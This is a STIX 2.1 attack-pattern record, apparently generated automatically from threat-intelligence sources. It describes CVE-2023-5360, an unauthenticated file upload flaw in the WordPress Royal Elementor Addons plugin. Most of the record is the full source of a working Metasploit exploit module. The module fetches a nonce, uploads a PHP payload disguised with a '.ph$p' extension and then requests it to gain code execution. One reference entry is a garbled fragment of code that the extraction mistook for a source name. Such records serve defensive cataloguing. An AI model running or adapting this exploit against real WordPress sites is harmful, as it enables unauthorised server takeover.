{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--258f3672-ceca-42d4-a264-81d588bcd8a2",
    "created": "2024-08-14T17:07:22.523266Z",
    "modified": "2024-08-14T17:07:22.52327Z",
    "name": "WordPress Royal Elementor Addons RCE",
    "description": " Exploit for the unauthenticated file upload vulnerability in WordPress Royal Elementor Addons and Templates plugin (< 1.3.79). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_royal_elementor_addons_rce.rb",
            "external_id": "wp_royal_elementor_addons_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-5360"
        },
        {
            "source_name": "reference",
            "url": "https://vulners.com/nuclei/NUCLEI:CVE-2023-5360"
        },
        {
            "source_name": "WPVDB",
            "external_id": "281518ff-7816-4007-b712-63aed7828b34"
        },
        {
            "source_name": "fail_with(Failure::UnexpectedReply",
            "external_id": "PayloaduploadedbutnoURLreturnedintheresponse)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Royal Elementor Addons RCE',\n        'Description' => %q{\n          Exploit for the unauthenticated file upload vulnerability in WordPress Royal Elementor Addons and Templates plugin (< 1.3.79).\n        },\n        'Author' => [\n          'Fioravante Souza', # Vulnerability discovery\n          'Valentin Lobstein' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2023-5360'],\n          ['URL', 'https://vulners.com/nuclei/NUCLEI:CVE-2023-5360'],\n          ['WPVDB', '281518ff-7816-4007-b712-63aed7828b34']\n        ],\n        'Platform' => ['unix', 'linux', 'win', 'php'],\n        'Arch' => [ARCH_PHP, ARCH_CMD],\n        'Targets' => [['Automatic', {}]],\n        'DisclosureDate' => '2023-11-23',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n        'Privileged' => false,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n  )\n  end\n\n  def check\n    return CheckCode::Unknown unless wordpress_and_online?\n\n    wp_version = wordpress_version\n    print_status(\"WordPress Version: #{wp_version}\") if wp_version\n\n    check_code = check_plugin_version_from_readme('royal-elementor-addons', '1.3.79')\n\n    if check_code.code != 'appears'\n      return CheckCode::Safe\n    end\n\n    plugin_version = check_code.details[:version]\n    print_good(\"Detected Royal Elementor Addons version: #{plugin_version}\")\n    return CheckCode::Appears\n  end\n\n  def exploit\n    print_status('Attempting to retrieve nonce...')\n    nonce = retrieve_nonce\n\n    print_status('Sending payload')\n    uri = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')\n\n    data = {\n      'action' => 'wpr_addons_upload_file',\n      'max_file_size' => rand(10001),\n      'allowed_file_types' => 'ph$p',\n      'triggering_event' => 'click',\n      'wpr_addons_nonce' => nonce\n    }\n\n    file_content = '<?php '\n    file_content << (payload_instance.arch.include?(ARCH_PHP) ? payload.encoded : \"system(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));\")\n    file_content << '?>'\n\n    file_name = \"#{Rex::Text.rand_text_alphanumeric(8)}.ph$p\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(file_content, 'application/octet-stream', nil, \"form-data; name=\\\"uploaded_file\\\"; filename=\\\"#{file_name}\\\"\")\n    data.each_pair do |key, value|\n      post_data.add_part(value.to_s, nil, nil, \"form-data; name=\\\"#{key}\\\"\")\n    end\n\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'No response received from the target')\n    end\n\n    if res.code == 200 && res.body.include?('success')\n      print_good('Payload uploaded successfully')\n      response_data = JSON.parse(res.body)\n      if response_data.key?('data') && response_data['data'].key?('url')\n        file_url = response_data['data']['url']\n        print_status('Triggering the payload')\n        send_request_cgi({\n          'uri' => file_url,\n          'method' => 'GET'\n        })\n\n      else\n        fail_with(Failure::UnexpectedReply, 'Payload uploaded but no URL returned in the response')\n      end\n    else\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')\n    end\n  end\n\n  def retrieve_nonce\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path), 'method' => 'GET')\n\n    fail_with(Failure::Unreachable, 'No response received from the target') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP response code from the target: #{res.code}\") if res.code != 200\n\n    match = res.body.match(/var\\s+WprConfig\\s*=\\s*({.+?});/)\n    fail_with(Failure::NoTarget, 'Nonce not found in the response. Is Royal Elementor Addons activated AND being used by the WordPress site being targeted?') if match.nil? || match[1].nil?\n\n    nonce = JSON.parse(match[1])['nonce']\n    fail_with(Failure::NoTarget, 'Parsed a response, but the nonce value is missing') if nonce.nil?\n\n    print_good(\"Nonce found in response: #{nonce.inspect}\")\n    nonce\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-11-23",
    "x_mitre_platforms": [
        "['unix', 'linux', 'win', 'php']"
    ]
}